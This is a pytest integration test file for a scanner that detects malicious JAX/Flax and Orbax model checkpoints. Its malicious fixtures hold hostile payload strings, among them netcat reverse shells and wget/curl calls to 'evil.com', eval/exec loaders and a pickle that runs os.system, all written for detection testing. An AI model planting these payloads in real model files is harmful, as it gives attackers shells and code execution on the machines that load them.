"""Integration tests for enhanced JAX/Flax scanning functionality."""

import json

import msgpack
import numpy as np
import pytest

from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.flax_msgpack_scanner import FlaxMsgpackScanner
from modelaudit.scanners.jax_checkpoint_scanner import JaxCheckpointScanner


class TestJaxFlaxIntegration:
    """Integration tests for JAX/Flax model scanning."""

    def create_clean_flax_model(self):
        """Create a clean, legitimate Flax model."""
        return {
            "params": {
                "embeddings": {
                    "token_embedding": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tobytes(),
                    "position_embedding": np.random.normal(0, 0.1, (512, 128)).astype(np.float32).tobytes(),
                },
                "encoder": {
                    "layer_0": {
                        "self_attention": {
                            "query": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
                            "key": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
                            "value": np.random.normal(0, 0.1, (128, 128)).astype(np.float32).tobytes(),
                        },
                        "feed_forward": {
                            "intermediate": np.random.normal(0, 0.1, (128, 512)).astype(np.float32).tobytes(),
                            "output": np.random.normal(0, 0.1, (512, 128)).astype(np.float32).tobytes(),
                        },
                    }
                },
                "classifier": {
                    "dense": np.random.normal(0, 0.1, (128, 10)).astype(np.float32).tobytes(),
                },
            },
            "opt_state": {
                "step": 5000,
                "learning_rate": 0.001,
                "beta1": 0.9,
                "beta2": 0.999,
            },
            "metadata": {
                "model_name": "clean_transformer",
                "model_type": "transformer",
                "num_layers": 1,
                "hidden_size": 128,
                "vocab_size": 1000,
                "flax_version": "0.7.5",
                "jax_version": "0.4.23",
            },
        }

    def create_malicious_jax_model(self):
        """Create a malicious JAX/Flax model with security threats."""
        return {
            "params": {
                "embeddings": {
                    "token_embedding": np.random.normal(0, 0.1, (100, 64)).astype(np.float32).tobytes(),
                }
            },
            "__jax_array__": {
                "malicious_metadata": "fake_jax_array_implementation",
                "custom_deserializer": "eval(compile(open('/tmp/backdoor.py').read(), '<string>', 'exec'))",
            },
            "__orbax_metadata__": {
                "version": "0.1.0",
                "restore_fn": "lambda x: eval(x) if hasattr(__builtins__, 'eval') else exec(x)",
                "custom_serializer": "subprocess.run(['wget', 'http://evil.com/backdoor.sh'])",
            },
            "malicious_tensors": {"negative_dims": {"shape": [-1, -100, -1000], "dtype": "malicious_dtype"}},
            "__tree_flatten__": 'lambda: eval(\'__import__("os").system("id")\')',
            "model_config": {
                "custom_activation": 'lambda x: eval(\'__import__("os").system("whoami")\') or x',
                "loss_function": (
                    'exec(\'import subprocess; subprocess.call(["nc", "-e", "/bin/sh", "evil.com", "4444"])\')'
                ),
            },
        }

    def test_clean_flax_model_no_false_positives(self, tmp_path):
        """Test that clean Flax models don't trigger false positives."""
        clean_model = self.create_clean_flax_model()
        model_path = tmp_path / "clean_model.msgpack"

        with open(model_path, "wb") as f:
            msgpack.pack(clean_model, f, use_bin_type=True)

        scanner = FlaxMsgpackScanner()
        result = scanner.scan(str(model_path))

        assert result.success

        # Should have minimal issues
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0, (
            f"Clean model triggered critical issues: {[i.message for i in critical_issues]}"
        )

        # Architecture should be detected
        assert result.metadata.get("model_architecture") == "transformer"
        assert result.metadata.get("estimated_parameters") > 300000

    def test_malicious_jax_model_detection(self, tmp_path):
        """Test that malicious JAX models trigger security warnings."""
        malicious_model = self.create_malicious_jax_model()
        model_path = tmp_path / "malicious_model.jax"

        with open(model_path, "wb") as f:
            msgpack.pack(malicious_model, f, use_bin_type=True)

        scanner = FlaxMsgpackScanner()
        result = scanner.scan(str(model_path))

        assert result.success

        # Should trigger multiple critical issues
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) >= 10, f"Expected many critical issues, got {len(critical_issues)}"

        # Check for specific threat patterns
        issue_messages = [i.message.lower() for i in critical_issues]

        expected_patterns = ["jax_array", "orbax", "eval", "exec", "subprocess", "negative dimensions"]

        for pattern in expected_patterns:
            assert any(pattern in msg for msg in issue_messages), f"Missing detection of {pattern}"

    def test_file_extension_support(self, tmp_path):
        """Test support for various JAX/Flax file extensions."""
        simple_model = {"params": {"layer": b"\x00" * 100}, "step": 1000}

        extensions = [".msgpack", ".flax", ".orbax", ".jax"]

        for ext in extensions:
            model_path = tmp_path / f"test_model{ext}"
            with open(model_path, "wb") as f:
                msgpack.pack(simple_model, f)

            # Test scanner can handle the extension
            assert FlaxMsgpackScanner.can_handle(str(model_path)), f"Cannot handle {ext} extension"

            # Test actual scanning
            scanner = FlaxMsgpackScanner()
            result = scanner.scan(str(model_path))
            assert result.success, f"Failed to scan {ext} file"

    @pytest.mark.slow
    def test_large_model_support(self, tmp_path):
        """Test support for large JAX/Flax models."""
        # Create a model with substantial data; keep size reasonable in fast runs
        large_embedding = np.random.normal(0, 0.1, (10000, 512)).astype(np.float32).tobytes()

        large_model = {
            "params": {
                "large_embedding": large_embedding,
                "classifier": np.random.normal(0, 0.1, (512, 256)).astype(np.float32).tobytes(),
            },
            "metadata": {"model_type": "embedding", "embedding_size": 512, "vocab_size": 100000},
        }

        model_path = tmp_path / "large_model.flax"
        with open(model_path, "wb") as f:
            msgpack.pack(large_model, f, use_bin_type=True)

        scanner = FlaxMsgpackScanner()
        result = scanner.scan(str(model_path))

        assert result.success
        # Large embedding model may be detected as transformer due to size
        assert result.metadata.get("model_architecture") in ["embedding", "transformer"]
        # With smaller synthetic data, still ensure parameter estimation is non-trivial
        assert result.metadata.get("estimated_parameters") > 1000000

    def test_clean_orbax_checkpoint(self, tmp_path):
        """Test scanning of clean Orbax checkpoint directories."""
        orbax_dir = tmp_path / "clean_orbax"
        orbax_dir.mkdir()

        # Clean metadata
        metadata = {
            "version": "0.1.0",
            "type": "orbax_checkpoint",
            "format": "flax",
            "model_config": {"architecture": "transformer", "layers": 1, "hidden_size": 128},
        }

        # Clean parameter data
        params = {
            "model": {
                "embeddings": {
                    "vocab_size": 1000,
                    "weights": np.random.normal(0, 0.1, (1000, 128)).astype(np.float32).tolist(),
                }
            }
        }

        with open(orbax_dir / "metadata.json", "w") as f:
            json.dump(metadata, f)

        with open(orbax_dir / "params.json", "w") as f:
            json.dump(params, f)

        scanner = JaxCheckpointScanner()
        result = scanner.scan(str(orbax_dir))

        assert result.success
        assert result.metadata.get("checkpoint_type") == "orbax_checkpoint"

        # Should have minimal critical issues
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0, (
            f"Clean Orbax checkpoint triggered critical issues: {[i.message for i in critical_issues]}"
        )

    def test_malicious_orbax_checkpoint(self, tmp_path):
        """Test detection of malicious Orbax checkpoints."""
        orbax_dir = tmp_path / "malicious_orbax"
        orbax_dir.mkdir()

        # Malicious metadata
        malicious_metadata = {
            "version": "0.1.0",
            "type": "orbax_checkpoint",
            "restore_fn": "eval",
            "custom_deserializer": "lambda data: exec('import os; os.system(\"curl http://evil.com/pwned\")')",
            "jax_config": {
                "host_callback": "jax.experimental.host_callback.call(os.system, 'nc -e /bin/sh evil.com 4444')"
            },
        }

        with open(orbax_dir / "metadata.json", "w") as f:
            json.dump(malicious_metadata, f)

        # Create dangerous pickle file
        dangerous_pickle = b"\x80\x03cos\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03."

        with open(orbax_dir / "checkpoint", "wb") as f:
            f.write(dangerous_pickle)

        scanner = JaxCheckpointScanner()
        result = scanner.scan(str(orbax_dir))

        assert result.success

        # Should trigger critical issues
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) >= 3, f"Expected multiple critical issues, got {len(critical_issues)}"

        # Check for pickle opcode detection
        issue_messages = [i.message.lower() for i in result.issues]
        assert any("pickle opcode" in msg for msg in issue_messages), "Should detect dangerous pickle opcodes"

    @pytest.mark.slow
    def test_jax_specific_architecture_detection(self, tmp_path):
        """Test JAX-specific model architecture detection."""
        test_cases = [
            {
                "model": {
                    "params": {
                        "transformer": {
                            "attention": {"query": b"\x00" * 1000, "key": b"\x00" * 1000},
                            "feed_forward": {"dense": b"\x00" * 2000},
                        }
                    }
                },
                "expected_arch": "transformer",
            },
            {
                "model": {
                    "params": {
                        "conv_layers": {"conv1": b"\x00" * 3000, "conv2": b"\x00" * 3000},
                        "pooling": {"pool1": b"\x00" * 100},
                    }
                },
                "expected_arch": "cnn",
            },
            {
                "model": {
                    "params": {
                        "embeddings": {
                            # Reduce size to keep test lightweight while preserving behavior
                            "token_embedding": np.random.normal(0, 0.1, (5000, 300)).astype(np.float32).tobytes(),
                        }
                    }
                },
                "expected_arch": ["embedding", "transformer"],  # May be detected as either
            },
        ]

        for i, test_case in enumerate(test_cases):
            model_path = tmp_path / f"arch_test_{i}.flax"
            with open(model_path, "wb") as f:
                msgpack.pack(test_case["model"], f, use_bin_type=True)

            scanner = FlaxMsgpackScanner()
            result = scanner.scan(str(model_path))

            assert result.success
            expected_archs = (
                test_case["expected_arch"]
                if isinstance(test_case["expected_arch"], list)
                else [test_case["expected_arch"]]
            )
            actual_arch = result.metadata.get("model_architecture")
            assert actual_arch in expected_archs, f"Expected one of {expected_archs}, got {actual_arch}"

    def test_integration_with_cli(self, tmp_path):
        """Test that enhanced JAX/Flax scanning works through CLI."""
        clean_model = self.create_clean_flax_model()
        model_path = tmp_path / "integration_test.jax"

        with open(model_path, "wb") as f:
            msgpack.pack(clean_model, f, use_bin_type=True)

        # Import and test via core scanning
        from modelaudit.core import scan_model_directory_or_file

        result = scan_model_directory_or_file(str(model_path))
        assert result["success"]
        # Check that at least one asset was scanned and has the expected architecture
        assets = result.get("assets", [])
        assert len(assets) > 0

        # Check file metadata for architecture info
        file_meta = result.get("file_metadata", {})
        model_metadata = file_meta.get(str(model_path), {})
        assert model_metadata.get("model_architecture") == "transformer"
